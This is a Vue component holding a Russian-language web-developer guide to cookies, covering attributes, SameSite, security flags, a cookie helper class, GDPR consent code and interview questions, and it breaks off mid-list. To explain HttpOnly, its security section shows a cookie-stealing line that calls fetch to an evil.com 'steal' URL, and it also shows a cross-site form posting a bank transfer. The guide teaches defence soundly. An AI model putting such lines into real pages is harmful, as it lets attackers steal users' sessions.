<script setup lang="ts">
import {onMounted, ref} from "vue"
import Prism from 'prismjs'
import 'prismjs/themes/prism-tomorrow.css'
import 'prismjs/components/prism-javascript.js'
import 'prismjs/components/prism-http.js'

const cookieBasicsSnippet = `
// Что такое Cookie?
// Cookie - это небольшие текстовые данные (до 4KB),
// которые браузер хранит на компьютере пользователя
// и отправляет с каждым HTTP-запросом на тот же домен

// Основное предназначение:
// 1. Сохранение состояния между запросами (HTTP без состояния)
// 2. Аутентификация пользователя
// 3. Отслеживание сессий
// 4. Персонализация (настройки, язык, тема)
// 5. Аналитика и отслеживание поведения

// Ограничения:
// - Максимум 4096 байт на одну cookie
// - До 20 cookies на домен (зависит от браузера)
// - До 300 cookies всего
// - Автоматически отправляются с КАЖДЫМ запросом
`

const clientSideSnippet = `
// ==========================================
// СОЗДАНИЕ COOKIE НА СТОРОНЕ КЛИЕНТА
// ==========================================

// 1. Базовое создание cookie
document.cookie = "username=John Doe"

// 2. Cookie с датой истечения
const expires = new Date()
expires.setDate(expires.getDate() + 7) // Через 7 дней
document.cookie = \`username=John Doe; expires=\${expires.toUTCString()}\`

// 3. Cookie с максимальным возрастом (предпочтительнее expires)
document.cookie = "sessionId=abc123; max-age=3600" // 1 час в секундах

// 4. Cookie с путем
document.cookie = "theme=dark; path=/" // Доступна на всех страницах
document.cookie = "adminToken=xyz; path=/admin" // Только для /admin/*

// 5. Cookie с доменом
document.cookie = "userId=123; domain=.example.com" // Для всех поддоменов

// 6. Безопасная cookie (только HTTPS)
document.cookie = "token=secret; secure"

// 7. HttpOnly cookie (НЕ работает из JavaScript!)
// HttpOnly можно установить только на сервере
// document.cookie = "sessionToken=abc; httpOnly" // ❌ НЕ РАБОТАЕТ!

// 8. SameSite атрибут
document.cookie = "tracking=xyz; SameSite=Strict"
document.cookie = "auth=token; SameSite=Lax"
document.cookie = "cross=data; SameSite=None; Secure" // None требует Secure

// 9. Комплексный пример
function setCookie(name, value, days, options = {}) {
  let cookie = \`\${encodeURIComponent(name)}=\${encodeURIComponent(value)}\`

  if (days) {
    const expires = new Date()
    expires.setDate(expires.getDate() + days)
    cookie += \`; expires=\${expires.toUTCString()}\`
  }

  if (options.path) cookie += \`; path=\${options.path}\`
  if (options.domain) cookie += \`; domain=\${options.domain}\`
  if (options.secure) cookie += '; secure'
  if (options.sameSite) cookie += \`; SameSite=\${options.sameSite}\`

  document.cookie = cookie
}

// Использование
setCookie('username', 'John Doe', 7, {
  path: '/',
  secure: true,
  sameSite: 'Lax'
})
`

const readDeleteCookieSnippet = `
// ==========================================
// ЧТЕНИЕ И УДАЛЕНИЕ COOKIES
// ==========================================

// Чтение всех cookies
console.log(document.cookie)
// "username=John Doe; theme=dark; sessionId=abc123"

// Парсинг cookies в объект
function getCookies() {
  return document.cookie.split('; ').reduce((acc, cookie) => {
    const [name, value] = cookie.split('=')
    acc[decodeURIComponent(name)] = decodeURIComponent(value)
    return acc
  }, {})
}

const cookies = getCookies()
console.log(cookies.username) // "John Doe"

// Получение конкретной cookie
function getCookie(name) {
  const matches = document.cookie.match(
    new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()[]\\\/+^])/g, '\\$1') + '=([^;]*)')
  )
  return matches ? decodeURIComponent(matches[1]) : undefined
}

console.log(getCookie('username')) // "John Doe"

// Удаление cookie
function deleteCookie(name, options = {}) {
  setCookie(name, '', -1, options) // Устанавливаем срок в прошлом
}

deleteCookie('username', { path: '/' })

// Более надежное удаление
function removeCookie(name, path = '/', domain = '') {
  document.cookie = \`\${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=\${path}\${domain ? \`; domain=\${domain}\` : ''}\`
}
`

const serverSideSnippet = `
// ==========================================
// СОЗДАНИЕ COOKIE НА СТОРОНЕ СЕРВЕРА
// ==========================================

// Node.js + Express
const express = require('express')
const app = express()

// 1. Базовая установка cookie
app.get('/login', (req, res) => {
  res.cookie('username', 'John Doe')
  res.send('Cookie set!')
})

// 2. Cookie с опциями
app.get('/secure-login', (req, res) => {
  res.cookie('sessionId', 'abc123', {
    maxAge: 3600000,    // 1 час в миллисекундах
    httpOnly: true,     // ❗ Недоступна из JavaScript
    secure: true,       // Только HTTPS
    sameSite: 'strict', // CSRF защита
    path: '/',
    domain: '.example.com'
  })
  res.send('Secure cookie set!')
})

// 3. Signed cookies (подписанные)
// Требует cookie-parser middleware с секретом
const cookieParser = require('cookie-parser')
app.use(cookieParser('my-secret-key'))

app.get('/signed', (req, res) => {
  res.cookie('userId', '123', { signed: true })
  res.send('Signed cookie set!')
})

// Чтение signed cookie
app.get('/read-signed', (req, res) => {
  console.log(req.signedCookies.userId) // '123'
  res.send('Signed cookie read!')
})

// 4. Удаление cookie
app.get('/logout', (req, res) => {
  res.clearCookie('sessionId', {
    path: '/',
    domain: '.example.com'
  })
  res.send('Cookie deleted!')
})

// 5. Множественные cookies
app.get('/set-multiple', (req, res) => {
  res.cookie('theme', 'dark')
  res.cookie('language', 'ru')
  res.cookie('token', 'xyz', { httpOnly: true })
  res.send('Multiple cookies set!')
})
`

const serverSideHeadersSnippet = `
// Set-Cookie заголовок напрямую (любой сервер)

// HTTP Response Header:
Set-Cookie: username=John%20Doe; Max-Age=3600; Path=/; Secure; HttpOnly; SameSite=Strict

// Множественные cookies - множественные заголовки:
Set-Cookie: sessionId=abc123; HttpOnly; Secure
Set-Cookie: theme=dark; Path=/
Set-Cookie: lang=ru; Max-Age=2592000

// Next.js API Route
export default function handler(req, res) {
  res.setHeader('Set-Cookie', [
    'token=xyz; HttpOnly; Secure; SameSite=Strict; Max-Age=3600; Path=/',
    'theme=dark; Path=/; Max-Age=31536000'
  ])
  res.status(200).json({ message: 'Cookies set!' })
}

// PHP
<?php
setcookie("username", "John Doe", [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => '.example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
?>

// Python (Flask)
from flask import Flask, make_response

@app.route('/set-cookie')
def set_cookie():
    resp = make_response('Cookie set!')
    resp.set_cookie(
        'sessionId',
        'abc123',
        max_age=3600,
        secure=True,
        httponly=True,
        samesite='Strict'
    )
    return resp
`

const cookieAttributesSnippet = `
// ==========================================
// АТРИБУТЫ COOKIE И ИХ ВЛИЯНИЕ
// ==========================================

// 1. expires - дата истечения (устаревший подход)
const expires = new Date('2025-12-31T23:59:59')
document.cookie = \`oldStyle=value; expires=\${expires.toUTCString()}\`
// Удаляется после указанной даты

// 2. Max-Age - время жизни в секундах (современный подход)
document.cookie = "modern=value; max-age=3600" // 1 час
document.cookie = "session=value" // Session cookie - удалится при закрытии браузера
document.cookie = "persistent=value; max-age=31536000" // 1 год

// 3. Path - ограничение по URL пути
document.cookie = "global=value; path=/" // Доступна везде
document.cookie = "admin=value; path=/admin" // Только /admin/*
document.cookie = "blog=value; path=/blog" // Только /blog/*

// Примеры доступности:
// Cookie: "data=123; path=/admin"
// ✅ Доступна: /admin, /admin/users, /admin/settings
// ❌ Недоступна: /, /blog, /user

// 4. Domain - ограничение по домену
document.cookie = "sub=value; domain=.example.com" // Все поддомены
document.cookie = "main=value; domain=example.com" // Только example.com
document.cookie = "nosub=value" // Только текущий хост

// Примеры:
// Cookie: "data=123; domain=.example.com"
// ✅ Доступна: example.com, api.example.com, blog.example.com
// Cookie: "data=123" (без domain)
// ✅ Доступна: только на example.com
// ❌ Недоступна: api.example.com

// 5. Secure - только HTTPS
document.cookie = "sensitive=value; secure"
// ✅ Передается: https://example.com
// ❌ НЕ передается: http://example.com
// ⚠️ Обязательно для токенов и сессий!

// 6. HttpOnly - недоступна из JavaScript (только сервер!)
// Устанавливается только через HTTP заголовок Set-Cookie
// ✅ Защита от XSS атак
// ❌ JavaScript не может прочитать или изменить
// Сервер:
res.cookie('sessionToken', 'abc', { httpOnly: true })
// Клиент:
console.log(document.cookie) // sessionToken НЕ будет в списке!

// 7. SameSite - защита от CSRF
// Strict - самый строгий
document.cookie = "strict=value; SameSite=Strict"
// ✅ Отправляется: переход внутри сайта
// ❌ НЕ отправляется: переход с другого сайта (даже по прямой ссылке!)

// Lax - сбалансированный (по умолчанию в современных браузерах)
document.cookie = "lax=value; SameSite=Lax"
// ✅ Отправляется: переход по ссылке (GET), внутри сайта
// ❌ НЕ отправляется: POST запросы с других сайтов, Ajax, iframe

// None - без ограничений (требует Secure!)
document.cookie = "cross=value; SameSite=None; Secure"
// ✅ Отправляется: везде, включая cross-site запросы
// ⚠️ Должен быть установлен Secure (HTTPS)
`

const sameSiteExamplesSnippet = `
// ==========================================
// SameSite ДЕТАЛЬНО - ПРАКТИЧЕСКИЕ ПРИМЕРЫ
// ==========================================

// Сценарий: Пользователь на evil.com, переходит на bank.com

// 1. SameSite=Strict
document.cookie = "authToken=abc123; SameSite=Strict; Secure; HttpOnly"

// evil.com → <a href="https://bank.com/transfer">Link</a>
// Клик по ссылке → bank.com
// ❌ Cookie authToken НЕ отправляется!
// Результат: Пользователь выглядит неавторизованным

// evil.com → <form action="https://bank.com/transfer" method="POST">
// ❌ Cookie authToken НЕ отправляется!
// Результат: CSRF атака провалилась ✅

// 2. SameSite=Lax (по умолчанию)
document.cookie = "sessionId=xyz789; SameSite=Lax; Secure; HttpOnly"

// evil.com → <a href="https://bank.com/account">Link</a>
// ✅ Cookie sessionId ОТПРАВЛЯЕТСЯ
// Результат: Пользователь видит свой аккаунт

// evil.com → <form action="https://bank.com/transfer" method="POST">
// ❌ Cookie sessionId НЕ отправляется!
// Результат: CSRF атака провалилась ✅

// evil.com → fetch('https://bank.com/api/balance')
// ❌ Cookie sessionId НЕ отправляется!

// 3. SameSite=None
document.cookie = "tracking=track123; SameSite=None; Secure"

// evil.com → любой запрос к bank.com
// ✅ Cookie tracking ВСЕГДА отправляется
// Использование: third-party сервисы, аналитика, виджеты

// Современная стратегия безопасности:
// Auth cookies: SameSite=Strict или Lax + HttpOnly + Secure
// Tracking cookies: SameSite=None + Secure
// Session cookies: SameSite=Lax + HttpOnly + Secure
`

const securitySnippet = `
// ==========================================
// БЕЗОПАСНОСТЬ COOKIES
// ==========================================

// ❌ НЕБЕЗОПАСНО - что НЕ хранить в cookies
const badPractices = {
  passwords: 'user123',              // Никогда!
  creditCards: '4111-1111-1111-1111', // Никогда!
  personalData: {
    ssn: '123-45-6789',              // Никогда!
    privateKey: 'secret-key'         // Никогда!
  },
  largeData: 'x'.repeat(5000)        // Превышает лимит 4KB
}

// ✅ БЕЗОПАСНО - что можно хранить
const goodPractices = {
  // 1. Session ID (с HttpOnly!)
  sessionId: 'random-secure-token-abc123',

  // 2. Preferences (некритичные настройки)
  theme: 'dark',
  language: 'ru',
  fontSize: '16px',

  // 3. Analytics tokens
  analyticsId: 'GA-123456',

  // 4. JWT token (с правильными флагами!)
  authToken: 'eyJhbGc...', // + HttpOnly + Secure + SameSite=Strict
}

// Правильная установка auth cookie на сервере
res.cookie('authToken', jwtToken, {
  httpOnly: true,    // ❗ Защита от XSS
  secure: true,      // ❗ Только HTTPS
  sameSite: 'strict', // ❗ Защита от CSRF
  maxAge: 3600000,   // 1 час
  path: '/',
  signed: true       // Подпись для защиты от подделки
})

// XSS атака - почему HttpOnly важен
// ❌ БЕЗ HttpOnly:
document.cookie = "token=secret123"
// Злоумышленник может:
const stolen = document.cookie // "token=secret123"
fetch('https://evil.com/steal?cookie=' + stolen)

// ✅ С HttpOnly (устанавливается на сервере):
res.cookie('token', 'secret123', { httpOnly: true })
// Злоумышленник НЕ может:
console.log(document.cookie) // token не виден!

// CSRF защита - SameSite в действии
// Атака: пользователь на evil.com
// evil.com отправляет форму:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>

// ❌ БЕЗ SameSite:
res.cookie('session', 'abc123') // Cookie отправится с формой!

// ✅ С SameSite=Lax или Strict:
res.cookie('session', 'abc123', { sameSite: 'lax' })
// Cookie НЕ отправится с POST запросом с другого сайта!

// Session Fixation защита
// ❌ ПЛОХО: всегда использовать один session ID
function login(username, password) {
  // Проверка credentials...
  // Оставляем старый session ID
}

// ✅ ХОРОШО: регенерировать session после login
function secureLogin(username, password) {
  // Проверка credentials...
  const newSessionId = generateSecureToken()
  res.cookie('sessionId', newSessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000
  })
}
`

const cookieHelperSnippet = `
// ==========================================
// ПОЛЕЗНЫЙ КЛАСС ДЛЯ РАБОТЫ С COOKIES
// ==========================================

class CookieManager {
  // Установка cookie
  static set(name, value, options = {}) {
    const {
      days = 7,
      path = '/',
      domain,
      secure = true,
      sameSite = 'Lax'
    } = options

    let cookie = \`\${encodeURIComponent(name)}=\${encodeURIComponent(value)}\`

    if (days) {
      const expires = new Date()
      expires.setDate(expires.getDate() + days)
      cookie += \`; expires=\${expires.toUTCString()}\`
    }

    cookie += \`; path=\${path}\`
    if (domain) cookie += \`; domain=\${domain}\`
    if (secure) cookie += '; secure'
    if (sameSite) cookie += \`; SameSite=\${sameSite}\`

    document.cookie = cookie
    return true
  }

  // Получение cookie
  static get(name) {
    const matches = document.cookie.match(
      new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()[]\\\/+^])/g, '\\$1') + '=([^;]*)')
    )
    return matches ? decodeURIComponent(matches[1]) : null
  }

  // Получение всех cookies
  static getAll() {
    return document.cookie.split('; ').reduce((acc, cookie) => {
      const [name, value] = cookie.split('=')
      if (name) acc[decodeURIComponent(name)] = decodeURIComponent(value || '')
      return acc
    }, {})
  }

  // Удаление cookie
  static remove(name, options = {}) {
    return this.set(name, '', { ...options, days: -1 })
  }

  // Проверка существования
  static has(name) {
    return this.get(name) !== null
  }

  // Очистка всех cookies
  static clear() {
    const cookies = this.getAll()
    Object.keys(cookies).forEach(name => this.remove(name))
  }
}

// Использование
CookieManager.set('username', 'John Doe', {
  days: 30,
  secure: true,
  sameSite: 'Strict'
})

const username = CookieManager.get('username')
console.log(username) // "John Doe"

const allCookies = CookieManager.getAll()
console.log(allCookies) // { username: "John Doe", theme: "dark", ... }

CookieManager.remove('username')

if (CookieManager.has('sessionId')) {
  console.log('User is logged in')
}
`

const gdprSnippet = `
// ==========================================
// GDPR И COOKIE CONSENT
// ==========================================

// Категории cookies согласно GDPR
const cookieCategories = {
  // Необходимые - не требуют согласия
  necessary: {
    sessionId: 'abc123',
    csrfToken: 'xyz789',
    language: 'ru'
  },

  // Функциональные - улучшают UX
  functional: {
    theme: 'dark',
    fontSize: '16',
    sidebarCollapsed: 'true'
  },

  // Аналитические - требуют согласия
  analytics: {
    _ga: 'GA1.2.123456789',
    _gid: 'GA1.2.987654321'
  },

  // Рекламные - требуют согласия
  marketing: {
    fbp: 'fb.1.123456789',
    ads_id: 'ads-123'
  }
}

// Cookie Consent Manager
class CookieConsent {
  static CONSENT_KEY = 'cookie_consent'

  static setConsent(preferences) {
    const consent = {
      necessary: true, // Всегда true
      functional: preferences.functional || false,
      analytics: preferences.analytics || false,
      marketing: preferences.marketing || false,
      timestamp: new Date().toISOString()
    }

    CookieManager.set(this.CONSENT_KEY, JSON.stringify(consent), {
      days: 365,
      secure: true,
      sameSite: 'Lax'
    })

    this.applyCookies(consent)
  }

  static getConsent() {
    const consent = CookieManager.get(this.CONSENT_KEY)
    return consent ? JSON.parse(consent) : null
  }

  static hasConsent() {
    return this.getConsent() !== null
  }

  static applyCookies(consent) {
    // Необходимые cookies - всегда
    Object.entries(cookieCategories.necessary).forEach(([name, value]) => {
      CookieManager.set(name, value, { days: 1 })
    })

    // Функциональные
    if (consent.functional) {
      Object.entries(cookieCategories.functional).forEach(([name, value]) => {
        CookieManager.set(name, value, { days: 365 })
      })
    }

    // Аналитические
    if (consent.analytics) {
      // Загрузка Google Analytics
      this.loadGoogleAnalytics()
    }

    // Рекламные
    if (consent.marketing) {
      // Загрузка рекламных скриптов
      this.loadMarketingScripts()
    }
  }

  static loadGoogleAnalytics() {
    // Загрузка GA только после согласия
    const script = document.createElement('script')
    script.src = 'https://www.googletagmanager.com/gtag/js?id=GA_MEASUREMENT_ID'
    document.head.appendChild(script)
  }

  static loadMarketingScripts() {
    // Загрузка рекламных пикселей
  }

  static revokeConsent() {
    CookieManager.remove(this.CONSENT_KEY)
    // Удаление всех необязательных cookies
    this.clearNonEssentialCookies()
  }

  static clearNonEssentialCookies() {
    const consent = this.getConsent()
    if (!consent) return

    if (!consent.functional) {
      Object.keys(cookieCategories.functional).forEach(name => {
        CookieManager.remove(name)
      })
    }

    if (!consent.analytics) {
      Object.keys(cookieCategories.analytics).forEach(name => {
        CookieManager.remove(name)
      })
    }

    if (!consent.marketing) {
      Object.keys(cookieCategories.marketing).forEach(name => {
        CookieManager.remove(name)
      })
    }
  }
}

// Использование в приложении
window.addEventListener('DOMContentLoaded', () => {
  if (!CookieConsent.hasConsent()) {
    // Показываем баннер согласия
    showCookieBanner()
  } else {
    // Применяем сохраненные настройки
    const consent = CookieConsent.getConsent()
    CookieConsent.applyCookies(consent)
  }
})

function showCookieBanner() {
  // UI для получения согласия пользователя
  // После получения согласия:
  CookieConsent.setConsent({
    functional: true,
    analytics: true,
    marketing: false
  })
}
`

const highlightedCookieBasics = ref('')
const highlightedClientSide = ref('')
const highlightedReadDelete = ref('')
const highlightedServerSide = ref('')
const highlightedServerHeaders = ref('')
const highlightedCookieAttributes = ref('')
const highlightedSameSiteExamples = ref('')
const highlightedSecurity = ref('')
const highlightedCookieHelper = ref('')
const highlightedGDPR = ref('')

onMounted(() => {
  highlightedCookieBasics.value = Prism.highlight(cookieBasicsSnippet, Prism.languages.javascript, 'javascript')
  highlightedClientSide.value = Prism.highlight(clientSideSnippet, Prism.languages.javascript, 'javascript')
  highlightedReadDelete.value = Prism.highlight(readDeleteCookieSnippet, Prism.languages.javascript, 'javascript')
  highlightedServerSide.value = Prism.highlight(serverSideSnippet, Prism.languages.javascript, 'javascript')
  highlightedServerHeaders.value = Prism.highlight(serverSideHeadersSnippet, Prism.languages.javascript, 'javascript')
  highlightedCookieAttributes.value = Prism.highlight(cookieAttributesSnippet, Prism.languages.javascript, 'javascript')
  highlightedSameSiteExamples.value = Prism.highlight(sameSiteExamplesSnippet, Prism.languages.javascript, 'javascript')
  highlightedSecurity.value = Prism.highlight(securitySnippet, Prism.languages.javascript, 'javascript')
  highlightedCookieHelper.value = Prism.highlight(cookieHelperSnippet, Prism.languages.javascript, 'javascript')
  highlightedGDPR.value = Prism.highlight(gdprSnippet, Prism.languages.javascript, 'javascript')
})

</script>

<template>
  <v-app>
    <v-main>
      <v-container>
        <v-row justify="center">
          <v-col lg="10">
            <h1 class="text-h4 font-weight-bold mb-6">
              Cookie: Полное руководство для веб-разработчика
            </h1>

            <p class="font-weight-regular mb-6">
              <b>Cookie (куки)</b> — это небольшие фрагменты текстовых данных (до 4KB), которые веб-сервер
              отправляет браузеру, а браузер сохраняет на компьютере пользователя и автоматически отправляет
              обратно серверу с каждым последующим HTTP-запросом. Cookies позволяют серверу "запоминать"
              состояние между запросами, несмотря на то, что HTTP протокол не сохраняет состояние.
            </p>

            <h2 class="text-h5 font-weight-bold mb-3">Что такое Cookie и зачем они нужны?</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedCookieBasics"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Основные характеристики Cookie</h2>
            <v-row class="mb-6">
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="primary" class="mb-2">mdi-database</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">Хранение</h3>
                  <ul class="text-left pl-4">
                    <li><strong>До 4096 байт</strong> на cookie</li>
                    <li><strong>~20 cookies</strong> на домен</li>
                    <li><strong>~300 cookies</strong> всего</li>
                    <li>Хранятся в браузере</li>
                    <li>Могут иметь срок истечения</li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="success" class="mb-2">mdi-swap-horizontal</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">Передача</h3>
                  <ul class="text-left pl-4">
                    <li><strong>Автоматически</strong> с каждым запросом</li>
                    <li>В HTTP заголовке <code>Cookie:</code></li>
                    <li>Только на тот же домен</li>
                    <li>Можно ограничить по пути</li>
                    <li>HTTPS через <code>Secure</code></li>
                  </ul>
                </v-card>
              </v-col>
              <v-col cols="12" md="4">
                <v-card class="pa-4 h-100 text-center">
                  <v-icon size="large" color="warning" class="mb-2">mdi-shield-check</v-icon>
                  <h3 class="text-h6 font-weight-bold mb-2">Безопасность</h3>
                  <ul class="text-left pl-4">
                    <li><code>HttpOnly</code> - защита от XSS</li>
                    <li><code>Secure</code> - только HTTPS</li>
                    <li><code>SameSite</code> - защита от CSRF</li>
                    <li>Подписанные cookies</li>
                    <li>Шифрование данных</li>
                  </ul>
                </v-card>
              </v-col>
            </v-row>

            <h2 class="text-h5 font-weight-bold mb-3">Что можно и нельзя хранить в Cookie</h2>
            <v-table density="comfortable" class="mb-8">
              <thead>
              <tr>
                <th class="text-left font-weight-bold">Тип данных</th>
                <th class="text-left font-weight-bold">Можно ли хранить?</th>
                <th class="text-left font-weight-bold">Примеры</th>
                <th class="text-left font-weight-bold">Рекомендации</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <td><b>Session ID</b></td>
                <td class="text-success">✅ Да</td>
                <td>random-token-abc123</td>
                <td>С HttpOnly + Secure + SameSite</td>
              </tr>
              <tr>
                <td><b>JWT токены</b></td>
                <td class="text-success">✅ Да</td>
                <td>eyJhbGc...</td>
                <td>С HttpOnly + Secure + SameSite=Strict</td>
              </tr>
              <tr>
                <td><b>Настройки UI</b></td>
                <td class="text-success">✅ Да</td>
                <td>theme=dark, lang=ru</td>
                <td>Некритичные данные, без Secure</td>
              </tr>
              <tr>
                <td><b>Analytics ID</b></td>
                <td class="text-success">✅ Да</td>
                <td>_ga=GA1.2.123</td>
                <td>С SameSite=None для third-party</td>
              </tr>
              <tr>
                <td><b>Пароли</b></td>
                <td class="text-error">❌ Никогда!</td>
                <td>-</td>
                <td>Используйте серверные сессии</td>
              </tr>
              <tr>
                <td><b>Платежные данные</b></td>
                <td class="text-error">❌ Никогда!</td>
                <td>-</td>
                <td>PCI DSS запрещает</td>
              </tr>
              <tr>
                <td><b>Персональные данные</b></td>
                <td class="text-error">❌ Крайне не рекомендуется</td>
                <td>SSN, паспорт</td>
                <td>GDPR нарушения</td>
              </tr>
              <tr>
                <td><b>Большие данные</b></td>
                <td class="text-error">❌ Нет</td>
                <td>&gt;4KB</td>
                <td>Используйте localStorage или сервер</td>
              </tr>
              </tbody>
            </v-table>

            <h2 class="text-h5 font-weight-bold mb-3">Создание Cookie на стороне клиента</h2>
            <pre class="mb-6 pa-6 rounded-lg custom-code"><code v-html="highlightedClientSide"></code></pre>

            <h3 class="text-h6 font-weight-bold mb-3">Чтение и удаление Cookie</h3>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedReadDelete"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Создание Cookie на стороне сервера</h2>
            <pre class="mb-6 pa-6 rounded-lg custom-code"><code v-html="highlightedServerSide"></code></pre>

            <h3 class="text-h6 font-weight-bold mb-3">Set-Cookie заголовок (разные платформы)</h3>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedServerHeaders"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Атрибуты Cookie и их влияние</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedCookieAttributes"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Таблица атрибутов Cookie</h2>
            <v-table density="comfortable" class="mb-8">
              <thead>
              <tr>
                <th class="text-left font-weight-bold">Атрибут</th>
                <th class="text-left font-weight-bold">Значения</th>
                <th class="text-left font-weight-bold">Назначение</th>
                <th class="text-left font-weight-bold">Обязательность</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <td><code>expires</code></td>
                <td>Дата UTC</td>
                <td>Дата истечения cookie</td>
                <td>Опционально (session cookie без него)</td>
              </tr>
              <tr>
                <td><code>Max-Age</code></td>
                <td>Секунды</td>
                <td>Время жизни в секундах</td>
                <td>Опционально (приоритет над expires)</td>
              </tr>
              <tr>
                <td><code>Path</code></td>
                <td>/path</td>
                <td>URL путь доступности</td>
                <td>По умолчанию: текущий путь</td>
              </tr>
              <tr>
                <td><code>Domain</code></td>
                <td>.example.com</td>
                <td>Домен доступности</td>
                <td>По умолчанию: текущий хост</td>
              </tr>
              <tr>
                <td><code>Secure</code></td>
                <td>Флаг</td>
                <td>Только HTTPS</td>
                <td><strong>Обязательно для токенов!</strong></td>
              </tr>
              <tr>
                <td><code>HttpOnly</code></td>
                <td>Флаг</td>
                <td>Недоступна из JS</td>
                <td><strong>Обязательно для auth!</strong></td>
              </tr>
              <tr>
                <td><code>SameSite</code></td>
                <td>Strict/Lax/None</td>
                <td>CSRF защита</td>
                <td><strong>Рекомендуется всегда!</strong></td>
              </tr>
              </tbody>
            </v-table>

            <h2 class="text-h5 font-weight-bold mb-3">SameSite: детальное объяснение</h2>
            <pre class="mb-6 pa-6 rounded-lg custom-code"><code v-html="highlightedSameSiteExamples"></code></pre>

            <h3 class="text-h6 font-weight-bold mb-3">Сравнение SameSite режимов</h3>
            <v-table density="comfortable" class="mb-8">
              <thead>
              <tr>
                <th class="text-left font-weight-bold">Сценарий</th>
                <th class="text-left font-weight-bold">Strict</th>
                <th class="text-left font-weight-bold">Lax (по умолчанию)</th>
                <th class="text-left font-weight-bold">None</th>
              </tr>
              </thead>
              <tbody>
              <tr>
                <td>Переход по ссылке (GET)</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-success">✅ Да</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td>Форма POST с другого сайта</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td>AJAX/Fetch запрос</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td>Iframe с другого сайта</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-error">❌ Нет</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td>Навигация внутри сайта</td>
                <td class="text-success">✅ Да</td>
                <td class="text-success">✅ Да</td>
                <td class="text-success">✅ Да</td>
              </tr>
              <tr>
                <td>Требует Secure</td>
                <td class="text-warning">Рекомендуется</td>
                <td class="text-warning">Рекомендуется</td>
                <td class="text-error"><strong>Обязательно!</strong></td>
              </tr>
              </tbody>
            </v-table>

            <h2 class="text-h5 font-weight-bold mb-3">Безопасность Cookie</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedSecurity"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Полезный класс для работы с Cookie</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedCookieHelper"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">GDPR и Cookie Consent</h2>
            <pre class="mb-8 pa-6 rounded-lg custom-code"><code v-html="highlightedGDPR"></code></pre>

            <h2 class="text-h5 font-weight-bold mb-3">Частые вопросы на собеседовании</h2>
            <ol class="ol-list mb-8">
              <li class="mb-4">
                <p class="font-weight-bold mb-1">В чем разница между Cookie и LocalStorage?</p>
                <p class="font-weight-regular ma-0">
                  Cookie автоматически отправляются с каждым HTTP-запросом, имеют размер до 4KB и срок истечения.
                  LocalStorage не отправляется автоматически, имеет размер до 5-10MB, не имеет срока истечения,
                  но доступен только из JavaScript. Cookie лучше для аутентификации, LocalStorage для локальных данных.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Зачем нужен атрибут HttpOnly?</p>
                <p class="font-weight-regular ma-0">
                  HttpOnly делает cookie недоступной из JavaScript (document.cookie), что защищает от XSS-атак.
                  Злоумышленник не сможет украсть токен через <code>document.cookie</code>, даже если внедрит свой скрипт.
                  Обязательно для auth токенов и session ID!
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Как работает SameSite=Lax против CSRF?</p>
                <p class="font-weight-regular ma-0">
                  SameSite=Lax блокирует отправку cookie с POST-запросами с других сайтов, но разрешает при
                  обычной навигации (GET по ссылке). Это предотвращает CSRF атаки через формы, но позволяет
                  пользователю оставаться авторизованным при переходе по ссылкам.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Почему SameSite=None требует Secure?</p>
                <p class="font-weight-regular ma-0">
                  Браузеры требуют Secure (HTTPS) для SameSite=None, чтобы предотвратить отправку cookies
                  через незащищенное соединение при cross-site запросах. Это дополнительная мера безопасности
                  для третьесторонних cookies (реклама, аналитика).
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Как правильно хранить JWT в cookies?</p>
                <p class="font-weight-regular ma-0">
                  JWT должен храниться с флагами: <code>HttpOnly</code> (защита от XSS),
                  <code>Secure</code> (только HTTPS), <code>SameSite=Strict или Lax</code> (защита от CSRF).
                  На сервере проверять подпись JWT и регенерировать токен после логина для защиты от Session Fixation.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">В чем разница между expires и Max-Age?</p>
                <p class="font-weight-regular ma-0">
                  <code>expires</code> указывает абсолютную дату истечения (может быть проблемой при разных часовых поясах).
                  <code>Max-Age</code> указывает относительное время в секундах (более надежный подход).
                  Max-Age имеет приоритет, если указаны оба атрибута.
                </p>
              </li>
              <li class="mb-4">
                <p class="font-weight-bold mb-1">Что такое signed cookies и зачем они нужны?</p>
